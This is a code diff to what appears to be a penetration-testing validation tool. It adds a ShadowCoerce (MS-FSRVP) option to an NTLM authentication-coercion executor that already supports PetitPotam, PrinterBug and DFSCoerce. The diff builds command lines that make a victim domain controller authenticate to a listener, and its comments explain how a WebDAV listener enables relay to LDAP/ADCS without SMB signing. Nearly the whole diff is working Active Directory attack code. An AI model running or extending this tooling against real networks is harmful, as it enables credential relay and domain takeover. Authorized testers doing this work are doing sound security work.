@@ -54,7 +54,12 @@ from .process_manager import poll_for_capture
 
 
 # ---- coercion method choices (UNVERIFIED invocations -- see module docstring) --
-COERCION_METHODS = ("auto", "petitpotam", "printerbug", "dfscoerce")
+# T6/S3 adds shadowcoerce (MS-FSRVP) as a vector beyond PetitPotam/printerbug/dfscoerce.
+# WebDAV coercion is NOT a separate method: it is a LISTENER FORMAT -- pass a WebDAV
+# endpoint (``<host>@80/<path>``) as ``listener_host`` to petitpotam/dfscoerce so the
+# target's WebClient authenticates over HTTP (enabling relay to LDAP/ADCS without SMB
+# signing). Needs WebClient running on the target (not default on a DC) -> unverified.
+COERCION_METHODS = ("auto", "petitpotam", "printerbug", "dfscoerce", "shadowcoerce")
 
 # Authentication-context keywords that, together with the <DC>$ machine-account
 # name, mean the victim actually authenticated to our listener. Matching the SAM
@@ -117,6 +122,15 @@ def coercion_trigger_argv(method: str, victim_dc: str, listener_host: str,
     if method == "dfscoerce":
         return ["dfscoerce.py", "-u", user, "-d", domain, *secret,
                 listener_host, victim_dc]
+    if method == "shadowcoerce":
+        # ShadowCoerce = MS-FSRVP. Coercer has no `-m fsrvp`; filter to that protocol
+        # (``--filter-protocol-name MS-FSRVP`` -- confirmed flag). FSRVP is frequently
+        # disabled/patched, so this is an UNVERIFIED vector like the others. (WebDAV
+        # coercion is a listener FORMAT, not a method: pass ``<host>@80/<path>`` as the
+        # listener to petitpotam/dfscoerce.)
+        return ["coercer", "coerce", "-u", user, "-d", domain, *secret,
+                "-t", victim_dc, "-l", listener_host,
+                "--filter-protocol-name", "MS-FSRVP"]
     # auto -> coercer multiplexer (scan then coerce every reachable method).
     # Binary is lowercase 'coercer' (the Coercer entry point on Kali/kali-vr).
     return ["coercer", "coerce", "-u", user, "-d", domain, *secret,
@@ -158,8 +172,9 @@ class CoercionExecutor(ValidationExecutor):
             ),
             ParamSpec(
                 name="method", kind="free",
-                description="Coercion vector: 'auto' (Coercer multiplexer) or a "
-                            "single vector (petitpotam/printerbug/dfscoerce).",
+                description="Coercion vector: 'auto' (Coercer multiplexer) or a single "
+                            "vector (petitpotam/printerbug/dfscoerce/shadowcoerce). WebDAV "
+                            "coercion = a <host>@80/<path> listener_host on petitpotam/dfscoerce.",
                 recommended="auto",
                 rationale="Coercer's scan+coerce multiplexer tries every reachable "
                           "vector; override to force one (research 3.3).",
